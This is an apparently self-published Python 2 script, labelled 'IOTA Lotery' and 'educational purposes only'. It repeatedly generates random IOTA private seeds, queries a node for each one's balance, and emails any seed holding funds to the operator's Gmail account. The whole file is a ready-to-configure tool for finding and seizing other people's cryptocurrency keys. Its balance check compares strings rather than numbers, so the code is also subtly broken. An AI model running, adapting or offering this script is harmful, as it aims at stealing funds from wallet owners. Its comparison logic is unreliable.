########################################################################
############################ IOTA Lotery  ##############################
######################### Maria Isabel Rojo ############################
################ https://mirojoblog.blogspot.com.es/ ###################
############### Use it only for educational purposes ###################
################ I am not responsible of the bad or ####################
###################### illegal use of this code ########################
########################################################################

from random import SystemRandom
from iota import Iota
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
 
## CHANGE THIS - The mail "From" and the mail "To" where you whant to be inform.
fromaddr = "YOUR_MAIL@gmail.com"
toaddr = "TO_MAIL@gmail.com"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "YOU WIN THE IOTA LOTERY"

## Create random private IOTA seeds - NOT CHANGE

def crea_seed():
    alphabet = u'9ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    generator = SystemRandom()
    return(u''.join(generator.choice(alphabet) for _ in range(81)))

## Main class - NOT CHANGE
def main():
    i=1
    print "I start playing the IOTA lottery. Good luck."

    ##Infinite look how checks the randomly created seeds.

    while i>0:
        semilla = crea_seed() 

        ## CHANGE THIS - Here you need to include a Full IOTA Node instead localhost
        ## If you want to try quickly maybe It can be a good idea to install your own 
        ## Full Node  
        api = Iota('http://localhost:14265/', semilla)

        ## Download the account data of this private seed
        data = api.get_account_data()

        ## Select only the Total Balance from the downloaded account information
        saldo = str(api.get_inputs()['totalBalance'])

        if saldo > "1":

            body = "Seed: "+ semilla + " Balance: "+ str(saldo)

            msg.attach(MIMEText(body, 'plain'))

            ## We will use the gmail service to send the email in case that the script finds an account with more than 
            ## 1 iota (1 MIOTA = 1.000.000 IOTA)
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()

            ## CHANGE THIS -- Here you need to include your gmail mail and password to send the mails correctly
            server.login("YOUR_MAIL@gmail.com", "PASSWORD")
            text = msg.as_string()
            server.sendmail(fromaddr, toaddr, text)
            server.quit()

        else:
            print semilla+ ": " + str(saldo)

main()
